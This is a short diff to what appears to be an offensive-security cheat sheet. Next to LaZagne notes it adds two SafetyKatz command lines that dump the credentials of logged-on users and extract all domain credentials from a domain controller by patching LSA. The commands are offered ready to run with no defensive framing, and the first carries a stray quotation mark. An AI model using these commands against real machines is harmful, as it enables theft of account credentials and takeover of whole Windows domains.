@@ -1719,6 +1719,20 @@ LaZagne.exe all
 
 Documentation https://github.com/AlessandroZ/LaZagne[here]
 
+Credentials of users with sessions on the target computer
+
+```bash
+SafetyKatz.exe sekurlsa::evasive-keys exit"
+```
+
+All credentials from the domain extracted from DC
+
+```bash
+SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
+```
+
+
+
 [[ToSystem]]
 == ToSystem
 
